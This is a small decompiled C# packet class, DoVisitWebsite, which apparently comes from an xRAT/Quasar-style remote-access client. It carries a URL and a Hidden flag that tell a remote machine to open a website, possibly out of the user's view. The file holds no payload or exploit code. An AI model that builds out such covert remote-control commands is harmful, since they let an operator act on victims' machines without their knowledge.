using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000A1 RID: 161
	[Serializable]
	public class DoVisitWebsite : IPacket
	{
		// Token: 0x170000B3 RID: 179
		// (get) Token: 0x0600042E RID: 1070 RVA: 0x000041F0 File Offset: 0x000023F0
		// (set) Token: 0x0600042F RID: 1071 RVA: 0x000041F8 File Offset: 0x000023F8
		public string URL { get; set; }

		// Token: 0x170000B4 RID: 180
		// (get) Token: 0x06000430 RID: 1072 RVA: 0x00004201 File Offset: 0x00002401
		// (set) Token: 0x06000431 RID: 1073 RVA: 0x00004209 File Offset: 0x00002409
		public bool Hidden { get; set; }

		// Token: 0x06000432 RID: 1074 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoVisitWebsite()
		{
		}

		// Token: 0x06000433 RID: 1075 RVA: 0x00004212 File Offset: 0x00002412
		public DoVisitWebsite(string url, bool hidden)
		{
			this.URL = url;
			this.Hidden = hidden;
		}

		// Token: 0x06000434 RID: 1076 RVA: 0x00004228 File Offset: 0x00002428
		public void Execute(Client client)
		{
			client.Send<DoVisitWebsite>(this);
		}
	}
}
